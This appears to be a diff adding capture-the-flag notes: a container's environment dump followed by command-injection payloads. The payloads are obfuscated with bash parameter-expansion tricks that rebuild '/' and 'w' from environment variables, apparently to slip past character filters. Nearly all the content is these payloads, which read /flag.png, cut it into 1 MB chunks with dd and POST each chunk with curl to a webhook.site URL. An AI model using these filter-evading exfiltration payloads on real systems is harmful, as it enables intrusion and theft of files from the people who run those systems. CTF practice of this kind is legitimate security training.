@@ -1,0 +1,36 @@
+root@749e025964cc:/usr/local/bin# env
+HOSTNAME=749e025964cc
+PYTHON_VERSION=3.11.9
+PWD=/usr/local/bin
+PYTHON_SETUPTOOLS_VERSION=65.5.1
+HOME=/root
+LANG=C.UTF-8
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+TERM=xterm
+SHLVL=1
+PYTHON_PIP_VERSION=24.0/
+PYTHON_GET_PIP_SHA256=dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+OLDPWD=/
+
+"`Z=PYTHON_GET_PI${Z=P}_URL; cu${HOME:1:1}l htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+
+After debugging for an extremely long time of debugging, we found that webhook.site cannot accept 14 MB files... So we need to split them up. But the upload is ridiculously slow...
+
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=0 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=1000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=2000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=3000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=4000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=5000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=6000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=7000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=8000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=9000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=10000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=11000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=12000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=13000000 count=1000000 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
+"`Z=PYTHON_GET_PI${Z=P}_URL; ca${B=t} ${HOME:0:1}flag.png | ${D=d}d ski${E=p}=14000000 count=397496 bs=1 | cu${HOME:1:1}l --request POST -F data=@- htt${A=p}s:${HOME:0:1}${HOME:0:1}${!Z:34:1}ebhook.site${HOME:0:1}3310b00e-5da1-49d6-9296-9a5f49f08788`"
